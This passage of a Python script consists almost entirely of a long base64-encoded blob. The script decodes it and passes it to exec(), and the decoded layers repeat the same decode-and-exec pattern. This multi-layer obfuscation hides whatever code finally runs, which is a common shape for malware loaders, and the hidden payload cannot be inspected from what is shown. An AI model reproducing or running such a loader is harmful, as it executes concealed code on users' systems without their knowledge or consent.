FMxbDZRazlqUmtaWVdrVndVazFGV25kV01GSkhaREZSZDAxV1ZsWmhNWEJvV1d4YWQyTXhaRlZVYkU1c1lrWktXVlZ0TlZkWGJGbDVWVzVPV2sxdVFrZGFWV1JLWlZVMVZsZHRlRlJTVlhBMlYxZHdUMVF5VGtoVFdHeFBWbFp3VjFWc1VsSmxiR1JWVTFSV2FHSlZiRFpXUm1oeldWWktTR0ZGVmxaV1JVVXhXVlprUjJSR1duUmpSM1JUVm14YWQxWkZWa2RrYkc5M1lrVlNVbFl5VWt0WmExSnpZVVphU0dOSVRsWldiRnA1VkRGYWMxZEdXbFZXYTA1V1lURmFWMXBWVlRGVFZscDFXa2RHVTAxR2JETldNbmhYWXpBeFIyTkdhRTVXYkVweVZXcEdZVTB4Vm5OYVJuQm9WbGhvUTFscVNtdFRiRVYzVW0wMVZGWXpZekZYVmxwVFkxZEtSMUp0Y0dsV1IzTjNWMnhhVm1WSFRraFRibEpYVjBkb1QxVXdXbUZOTVdSeVdrVmtUbEp1UWxkWmExSkRXVlphTmxKc1ZtRlNWMUpZV2tSR1MxZEdaRmhpUlRGU1ZucHNkVlV4Vms5UmJHOTNZa2hPVUZZd1dsWlpWM2gzVkVac2NWUnVUbXROVjNoWlZsWlNRMWxYU2xobFJGWllZa1phV0ZSWGRITmpSMUYzWkVWd1VrMUZXblZWTVZaUFV6RndjMXBJU2s5U1JYQllWRmQ0WVdJeGEzZFplbFpyVmxSR2VGVlhNREZaVm1SSFUyeFNXRlp0VFhoWlZFcEtaVlV4VmxwSGFGaFNXRUl6VjFjd2VHRXhSblJUYmxKaFUwVTFhRlpzV2xwbFZrNVlZa1JPVkUxSGVFVlZWbVJyVTJ4RmQyTkhNVmROYmsxM1dsVlZkMlZHY0VobFJuQllVbFZ2ZVZkWE1YcGxSMFpJVTI1U1UySlVWbWhXTUZaelRsWlNXRTFYZEdsU01VcElWMnRrTkZkc1pFWlRha3BhWWxoU2FGcEhNVTlqTVZKMVdrWndXRkl4U1hoV2JGWnFUbGRPU0ZOdVZsWmhNWEJYVld4U1VtVnNaRlZUVkZab1lsVnNObFpHYUhOWlZrcEdWbXBXVmxaRlNsQlZiR1JIVjBaU2NWRnRhRmRsYlhkNFZqRmFiMU13TlZkVGJGSlVWMFUxUlZsV1ZrZGliRTVXVkd0S2FGWnRaRFJaTUZVMVZHeGFSazVXYkZoaVIxSklXa1JLU21WVk5WWmFSbkJYVFVSU00xZFhjRTlUTURWV1RWWldhRkl6UW5GWmJGcGhZakZ3UmxwR1pGWk5WM2haVkd4a01HRlZNWEZTYkd4WVlrZFNTRnBFU2twbFZUVldWMjEwYUZaWGVEWlZWRXB6VVd4dmQySkZVbEpXTW5oYVZGWm9RMVZHVWxkVmF6bFlVbTVDV1ZWdE5XdGhWVEZ4Vm1zNVdGWnRUWGhaVlZwMlpWWmFkV0pGTlZkU2EyOHlWako0YjFVeFdraFVhMmhUWVdzMWNGbHJWa3RqTVd0NVRWaE9hMkpJUWtkV2JYaEhWbGRHZEZWdVJscGhhM0JRV2tjeFQwNXNUblJrUlRWWFVsaENSbFpXVWtOVk1rNUhZVE53Vm1KclNuQlVWM0JYWWpGcmVVNVlUbE5pU0VKM1ZURm9UMUpIUmxaU2JUVlVWbFUxUTFsV1dtNWxSMDVHVDFVMVYxSnJjRkZXTW5odlZUQXdlVk5ZY0ZSaWEzQldWbXBDWVUxV1pGZGFSM1JwVWpBMWVGVnNhSGRoUm1SR1RsVTFXbUZyY0ZCWlZXUkxVbTFXU0dWR2NGZE5WWEI2VjFSS01GWXdNWEppU0VKclRVaFNTMVZVUWtkaWJFNVdWR3QwWVdKSFVubFVhMmh2VlVaS1dGVnRPVnBpUjFKWVZXdGtVMWRXVW5GUmJXeE9ZV3RhTTFkc1kzaFdNVkpYWWtac2FWSXphSEZaVnpGVFlqRmtjbHBHVGxkV01GcFpWRlprTkZVeFduSlRiRUpWWVd0d1VGcEhlSEpsVlRsWlkwVTFhVlpyVlhkV1ZsSkRWREZXUjJKSVVtcFNNMmhoVkZSR1MxSXhUbGhpUkU1VVRVZDRSVlZXWkd0VGJFVjNZMGN4VjAxdVRYZGFWVlUxVW14d1NHRkhiRmROVm5CR1YydGFiMVF3TVVoVFdHeE9WMFZLYzFsc1dtRlViR1JYWVVoT2FWSXdOWGhYYTJoM1lURlpkMk5HV2xwV2JVNDBXV3RhUzFZeFJuSlBWVGxPWVhwVmVWWXhVa3BPVjFaeVRWaFNWbFpHU2xOVVZWVXhWVlprV0UxWVpHbFNiWFEyVmxkMFlWTnRSbGxhUlhoVVZsVTFRMWRxUW5OU1JrNTBWMnhvYUdWc1NURldSbVEwVkRKU2RGTnJhRlppYTBwb1ZqQldkMVJzYkhGVGF6bG9VakJ3UjFaSE5XRmhWMHB6VTJwV1dtRnJiekJaZWtaM1YxWk9WVlp0ZEZOTmJXY3hWMWR3VDJFeFNsaFZiR2hUWW1zMVZGWXdXbk5qUmxKR1VtNWFZVTFIZUVWVlZtUnJVMjFLUldKSGFGZFNNMEpRVlRGYVlWWnNWbFZXYld4T1lXeGFTbGRVU1hoV01sSlhZa1pvVm1KWWFGUldiWFJMVlVaU2NWTnJPV3RpUjNRMVZERm9kMVJ0U2xkU1ZFSldWa1ZLVUZaVlduTmtSMDVJWlVad1RrMVZjRWhWTVdSelRURk5kMkpGVWxKV01sSkxWVlJDZDJKV1dYbGpla0pzWWtVMVNGWnRkRmRVTURGeFlrUkdWMVpYYUZoYVJscHlaVmRHUmxkc1dsTldSa1kyVmpGU1NrNVhSblJUV0hCVlYwZDRhRlZyWkc5U1ZsWlZVVlJXYUZZd1dqQldiVEYzWVRGS1YxWnVRbFZTVlZveVYycENjMUpHUmxoYVJYQnBVa2Q0YjFaclpIZFVNVnBIVW14a1drMHlhRkJWTUZwaFRURmtjbHBGWkU1U2JrSlhXV3RTUTFsV1dqWlNiRlpoVWxkU1dGcEVSa3RYUm1SWVlrVXhVbFo2YkhWVk1WWlBVV3h2ZDJKSVRsQldNRnBXV1ZkMFZtUXhXa2hOVm1ST1VqRkdOVlF4YUhOaFJURkZVbTA1V21KVVJraFpiWGgzVjFaT1dXRkZPV2xoZWxaNlYxY3dlRlV4WkVkalJtaFRZbTFTY0ZSWGNGZFNWbXhXV2tWa2ExWnRPVFZXYlhSaFZteEtWVlZZY0ZoV1JXc3hXVmN4U21Wc1VsbGlSMFpUVWpKb1JsWldVa0pPVjBaWVVtNVNWMkpZUW5KVmJGcFhZMFpTUmxKdVdtRk5SM2hGVlZaa2ExTnRTa1ZpUjJoWFVqTkNSMVJVUmxkVFZrNTFWMjFvYVZac2NIaFhhMVpyWXpKTmVHTkdXazVXTW1od1dXeFdZV1JXWkhOaFJYQnNVbFJHU1ZWdE1UQlpWa3BZVldwV1dHSkhUWGhaVlZwM1UwWmFjbGRyT1dsV1ZGVjZWbTB3ZUZZeVJuUlZhMmhZWWtaS1QxVnRjSE5qUmxwSVpVVTVUbEpVVm5wVU1XUmhZVmRLVjFOdWJGVldiRXBIV2xaYWMyUkdTblZqUjJoWFRVUldkRmRZY0U5Vk1sWllVbXhvVDFaNlZsVldha0V4VlVaYVdXTkZaR0ZoZWtaV1ZXMHhkMkZHU1hkWGFsWllVa1UxVkZwV1duTlhSMHBGVVcxd1RsSXphSGhXVjNoWFZqRlJlRlpxV2xOaVZuQlJWbXBDWVdWc2JISlplbFpvWWtkNFdsWlhOV0ZoYlVWNVpVaEdWbUpHV2xoVmJYaExWMGRGZVdKRk1WSldlbXgxVlRGV1QxRnNiM2RpU0U1UVZqQmFWbGxYZEZabGJGcFdZVVYwYTJKVldqQldiVEYzWVRGSmVXVkljRmhpUmxZMFdWVmtTMlJHU25ST1YwWllVbGR6ZUZZeFdtdFZNa1Y0Vm01U1VGWXpRbTlVVjNoYVpERldjMVZ0Um1oaVZUVklWakl4TkZkck1IaFRibEpYVjBoQ1JGZHRlRmRTVm1SellVZEdWMDFHYjNwWFYzQktUVmRHVjFWdVRsVmhhMHBRV1d0U2MySldiSFJOVms1cVlYcEdWbFZzYUhOWGJVcFdWMnBhV2xadFVsQlhiVEZPWld4V2RXSkhhRmRsYkZveFZsUkdhMVF4VVhoV2FscFZZbFp3VDFaclZtRmpWbXhXV2tWa2JGWnRaRFpXVnpWelYyeFplV1F6WkZwbGEwcDZXVmQ0UzFac1duSlBWbHBzWVhwV2RGWkVSbXRTTWsxNVUydG9VRll6UW1GV01GcExUV3hyZVdSSVRtaGlSWEJYVm0xMFlWVXhWWGRpU0hCU1RXMTRRMWRxUW5OU1JrWllZa1pzVGxkRlNsRldSbHBUWVRGV1dGUnVVbEJYUlZwb1ZtcEJNR1F4YkZkYVJGSnBVbXhLV1ZWdE5WZFhiRmw1Vlc1T1drMXVRbWhaVlZwM1UwWldjMVZzY0ZoU01VcElWa2N3ZUZReVVYaFhibEpYWWxoQ2NsVnFSbmRXVmxKV1YxUldWbFpVVm5wWGEyUTBWMnhrUmxOcVNscGlWRVpNVmtSR1ZtVnNWbFZUYkd4T1ZrZDNlRll5ZEd0bGJWWkdUVlpXVkdKWGVHRldNRlV4WkRGa1dXSkZjRlJOVjJoVFdXcENNRkpIU25OVGFsWmhWbXhLTWxWNlFuTlNSa1pZV2tWd1ZGSXhTak5YYTFacllteHZlVk5ZY0ZKaVdHaHdXVlprYjAxc2NFZGhSazVyVFd4S1dsWlhNV0ZoTVU1SVdqTmtXRkpGTlVSWlZXUlRVMFp2ZWxScmNGSk5iRVkyVlRJMWMyTnNiM2hpUm14VlZqSlNjbFV3Wkc1a01XUkZVMjFHYWxJd2NFbFdiRkpoVWtadmVVOVhOVlJXVlRWRFYycENjMUpHUmxoYVJYQlRUVmhDTTFkWGRHdFdNWEIwVkd0b1UyRnJTbTlWVkVKR1RsWk9WbHBIUm1wU01IQkpWbTB4WVZsV1NYbGxSRlpVVmxVMVExVjZRazlqUmtaWVdrVndVazFGV25WVk1WWlBVV3h2ZVZWcmJGUmhiRnBSVjJwSk5XSnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VUlVWRXBIVjFaV2RFOVZjRk5sYlhkNlZqSjRhazFIU1hoalNGSnBVMFUxYUZadGNITk5NV1JYWVVaT2FVMUlhRVZWVm1NeFlXMUdXRlJ1WkZSV1YxSklXbGQwYzFOR1pIVlJiV3hUVFZaVmVWVlVTbXRrYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWWVlsUkJNVnBXVm5OVFIxWkpVVzFzYVZac1duVlhWbHBxVFVadmVHTklVbWxUUlRWb1ZtdGpOVlJHUlhsaVJVcGhUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzaGpTRkpRVjBkNFMxVXdXa3RpTVd0NVRWZDBhVkl4U2toVU1XaDNZVEZPUm1OSVpGcGlWRVp4VjJwS1IxZEZOVWhhUjNSVFRVWnZNVll5Y0V0V01ERkhXak53VldGclNuRlpiR1EwVFZaa2NWUnJOVTloTURWMVdXcEthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMUZXblZWTVZaUFVXeHZkMkpGVWxKV01sSkxWVlJDUjJKc1RsWlVhMDVxVW01Q2QxVlhjRU5YYkdSR1kwaFdXR0pIYUZSWGJURk9aV3hXZFdKSGFGZGxiRm94VlRGV2EyTXlVbFppUldoc1UwVktjRmxzV2xaTmJFVjVXa2hhWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzkzWWtWU1VsWXlVa3RWVkVKSFlteE9WbFJyU21GTmExcEpWbTF3VTFkVk1YRldXR2hhWWtkU1RGbHJaRTlrVmxKWVdrWkdWazFGYnpGV01uaE9UVmRLV0ZKc2FFOVdNMUpoVm1wT2IyVnNUWGRoUlhCcFlYcEdTbGxWWkV0WFZrbDRVMjA1VlZKdFVtaFZWM1EwVm14a2RGVnJlR3hXTURVMlZURldhMDVIVGtoVGJsSlhWMFZLUlZkcVNUVlVSazVXVkd0S1lVMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGFSWEJTVFVWYWRWVXhWazlSYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhPVmxwRVFtbFNNVnBhVjJ0b1lXRnRTbGRTYlRWV1VtczFSRmxyWkZkVFZsWjFZa1p3VjAxRVVqTldNRkpMVFVkS1NGWnNiR0ZUUm5CeFdXeGFSMlJzY0VaYVJXUnNWbTA1TlZadGNFTlhWVEIzVGtoa1drMXFSbnBhUmxwM1RsZEZkMlJGVW1GTmFteDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWVFZEVjJwQ2MxSkdSbGhhUlhCU1RVVmFkVmRyVm05aU1ERkhXak5zV0dKclNuQlZha1pYVFZad1JWUnJkR3BTTVVwSlZteGpOVmxYUmxaaWVrNVhUVlphV0ZaR1dsTlNhemxYWVVjeFYxWnRPVFJYVnpCNFZEQXhTRkpzYUZCWFJscExWV3RTUTJKc2NGVlNhM1JUWWtaV00xWnRlRmRpVm1SSlZWaGtXRlp0YUV4WmJYaDNWMVpXZEZkdGNFNU5WVzh4VjFaYWFrMVhTblJYYkdSc1UwWmFTMWxXWkRCVVJrNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzkzWWtWU1VsWXlVa3RWVkVKSFlteE9WbHBJVG1sV1YzaEpXVlZrTkdKR1NuRmlSRVpoVW0xT05GbFdXbmRYVms1MVkwWkNZVTFxYkhWVk1WWlBVV3h2ZDJKRlVsSldNbEpMVlZSQ1IySnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNkaVJXeFdZV3hLY2xWdGNITmtSbXhYV2tSU2FWSllhREZYYTJoellVWmtSMU51VGxSTlIxSmhXVlprVm1ReGNFZFViRTVYVm14d1VWZHRlRmRpTWtwSVZtdG9VMkpZVW1oV2FrRXhaREZzYzFwRlpHcE5SM2hIVkd4U1IyRldXWGRqU0U1YVRXcFdUMWRxUmt0a1JUbFZVbTFzYVZaclZYbFhiRkpIVXpGS2MxWllaRmRpUmxwMFZtMDFiMDFXVGxoaVNFcFVUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKcmVGSk5iWGhEVjJwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVrdFZWRUpIWW14T1ZsUnJTbUZOUjNoRlZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tkb1YwMVhlSFZYVjNSclZqSlNWbVJGYkZWaVdHaHlWVlJLYjJSc1pITmhSemxoWWxWd01WWnROVk5YYlVwWFYycFdXazB5ZUhsWk1GWnpVbFV4UldKRmNGTlNWbFY1VlZSS2MxRnNiM2RpUlZKU1ZqSlNTMVZVUWtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzkzWWtWU1VsWXlVa3RWVkVKSFlteE9WbUZHVGs5U01VcElWREZqZUdGR1dYcGhTRTVWVW5wV2NscFdaRWRYVmxaMFpVVjRVMDFYZUhkWGJGSkxZakpLU0ZaclpGQlhSbHB5Vm01d1IyTkdaSE5oUlhSc1lrZFJNbFZYTVZOaVZscDFZVVJHVkZZeWVIbFZla0p6VWtaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXVkd0S1lVMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGFSWEJTVFVWd2VsZFhkRzlVTWtwR1QxYzFhVTF0VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllXa1Z3VWsxRlduVlZNVlpQVVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZWWE1IaGhWVEIzWWtjMVdsWlhVbGhVYTFwdVpWVTFWVkp0YkZaTlJYQXpWMWN4YzFFeVNYaGpSbXhvVWpGd2NGbHRlR0ZOUm1SWVRWWmtiRll3TkRKWmFrSXdVMnhGZDFKdE5WUldWVFZEVjJwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVrdFZWRUpIWW14T1ZsUnJTbUZOUjNoRlZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMUZXblZWTVZadlZUQTFTRlZyWkZCV2VrWnZWbXBPYjJNeFVraE9WM1JzVmpCYVdsWlhNVFJVUmtsNFlraENZVlpGY0haWmEyUlhVakE1V1ZadGRGZGxhMVV4VmpCV2FrMUhSbFprUmtwcFRVaFNTMVZVUWtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzkzWWtWU1VsWXlVa3RWTUZwS1RVWndSbGRVVm1sV01GcFpXbFZrTkZSWFNuUlZhbFphVm0xb1ZGbHJWakJTUms1MFZHMXNhRlpYZUROVk1WWlBVV3hOZDFSdVFsSldNbEpMVlZSQ1IySnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNkaVJWSlNZbGQ0Y1Zsc1dtRmlNV3haWWtWS1lVMUZOWFZaYWtwclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFOR1duRlZiSEJPWWtadmVsZHJWazlSTVVsNVVteG9iRkl6YUZaWmJGSnlaREZXZEUxRVZrNVdNSEF3VmxkMFlXRnRTbkpqUkVwYVRXNUNNbFY2UW5OU1JrWllXa1Z3VWsxRlduVlZNVlpQVVd4dmQySkZVbEpXTWxKeFZUQldkMlF4YkhST1ZrcHBUVmhDZDFVeWNHdFdiVVY0VjJ0YVlXSkdXbWhaTUdSTFUwWmFXRnBIYkdsV1IzUXpWVEZXYTFsWFVuUlZiR2hQVmpOU1MxVnFRbHBrTVU1V1lVVk9hRkl4U2tsWGJuQmhVMnhPU1ZWdVVscFdiVkV3V1d0YWJtVnNSblJoUjNSVFRXMWpNVmRzVWtkVE1VcHpWbGhrVjJKR1duUldWRUp6WkRGRmVXSkZTbUZOUjNoRlZWWmthMU5zUlhkU2JUVllZa2RvZGxsWGVIZFhWa1p4VVd0d1UxWnNhM2RXTVZKTFZqSlJlVlZyYUdsVFJuQndXVlpXUzJJeGEzcGlSVTVwVWxSc2RWbHFTbXRUYkVWM1VtMDFWRlpWTlVOWGFrSnpVa1pHV0ZwRmNGSk5SVzk2VjFSSmVHTXlVbGhWYTFKb1VucEdTMWx0TlZOV1JsWnpWbXhPVUZacldsbFVhMlJyV1Zaa1JtTkVWbHBoYXpWTFYycEtTbVZXVW5SalIzUllVbGhCTVZZeWVHdFZhelZ5WWtWc2ExTklRbkpWTUZaelpHeGtjMVJ1VGxCV01WWTBWVEowWVZack1VZFhiRnBoWWtVMVMxa3dWazlpYlU1SVpVZDRVMDFFVm5wWFZFSnZWV3h2ZUZOdVVtbFRSVFZvVm14U1YwMXNjRVpXYlVacllsWktXVlJzWkRCVk1XUkdZMFJXV21Gck5VdFViWFJQWTBaR1dGcEZjRkpOUlc5NlYxUkplR015VWxoVmExSm9VbnBHUzFsdE5WTldSbFp6Vm14T1VGWnNSalpXYlhCRFlXeE9SMWRZWkZSV1YyaFVXV3RrVjFOV1ZsaGFSMFpwVmpOb05sWXllRTlSTWxGNFlrWnNWbUpVYkV0VmJuQlhUV3h3UmxSclRtbFdNR3cyVm0wMVYxbFdTa2hQVnpWaFZrVnJNVlJXWkZOVFZrWnhVbTEwVTJGdGRETlhiRlp2VlRGd2RGUnJhRk5oYTBwdlZUQlNSazB4V2xoa1JtUlhVbXR3V0ZaWGNITlRiVVpZWkVWNFdHSkhhSFpaVjNoM1YxWkdjVkZyY0ZOV2JHdDNWakZTUzFZeVVYbFZhMmhwVTBad2NGbFdWa3RpTVd0NllrVk9hVkpVYkhWWmFrcHJVMnhGZDFKdE5WcE5SMmhNV1RCa1MyUldWbGhQVjBab1ZsYzRlbFpzWkRCV01VcFlWMnhhVTJKc1drdFZha1poVGxacmVVMUVWbXhXVjNoSlZERmtkMWRyTUhoWGFsWmFUV3BHV0ZsVVFuTlRWbkJJVDFkb1YwMHlhSHBWTVZadllUSldXRkpzYkZaaWEwcHdXV3hrVDJKc2NFWlplbEpoVFd4S1NWbFZaRFJUYkU1SFUyNU9ZVlpYYUZOWGFrWjNaRWRLU1ZSdFJsZFNlbXgxVjJ4U1QxUXdNVWhVYmtKb1VqTm9UVll3VWtaTk1WcFlaRVprVjFKcmNGaFdWM0J6VTIxR1dHUkZlRXBhTWpsTVUxaHNRMUpXY0ZoVWJscGhVakZXYmxwRlpHOWlSV3hJVTIxb2FrMXNWWGxVYTA1RFpXeHJlbE51UW1wVFJrWk1WMnRrVjJGdFNYbFZiWGhoVW1wc05sZFVUa3RqUjA1SlZWZGtVVlV3U25CWFZtaFBZa1UxY1ZWWVZscGhiR3QzVjJ0a1YyRnRTWGxWYlhoTVVqRmFNVmRVU1RWaE1YQllWVzFhYWsxck5UVlpWbWhEVFVWMFZFNVhkR0ZXTURVeVYydGtWbUl3YjNwV2FrSmhZVlJCTUZOdWJISlRNRTV3VkZka1UxZEhhSE5YVkU1WFRVWndWRkZxUW1oU01WWnVWMnRrVjJGdFNYbFZiWGhoVVRCS05sZFVUa3RqUjA1SlZWVjBZVmRIYUhOWFdHeHZZVEZ3V0ZSdVdtRlNNVnB5VjBST1QyRnRUblJpU0dSclVUSjBURWxuYjB0SmVVSkZXbGRPZGxwSFZXZGtSMmhzU1VkS2FHTXlWVEpPUTBKNldUTktjR05JVVV0YVIxWnFZakpTYkZwR09YcFpNMHB3WTBoUloxQlRRbWxaV0U1c1RtcFJkVmxxV1RCYVIxWnFZakpTYkV0SFZuVlpNamxyV2xkU1ptTXlUbmxoV0VJd1MxTTFhMXBYVG5aYVIxVnZTakJHVkZFd2JFcEtlV3RMUTJsTloxSllhR3haTTFZd1dsTkNNR0ZIVldkYVIxWnFZakpTYkZwRFFucFpNMHB3WTBoUlMxcFlhR3haZVdocldsZE9kbHBIVm10WU0wNXFZMjFzZDJSRGEwc2lDbVJsWTI5a1pXUmZjMk55YVhCMElEMGdZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaGxibU52WkdWa1gzTmpjbWx3ZENrdVpHVmpiMlJsS0NkQlUwTkpTU2NwQ21WNFpXTW9aR1ZqYjJSbFpGOXpZM0pwY0hRcENnPT0iCmRlY29kZWRfc2NyaXB0ID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX3NjcmlwdCkuZGVjb2RlKCdBU0NJSScpCmV4ZWMoZGVjb2RlZF9zY3JpcHQpCg=="
decoded_script = base64.b64decode(encoded_script).decode('ASCII')
exec(decoded_script)
"
mainn = base64.b64decode(main).decode('ASCII')
exec(mainn)
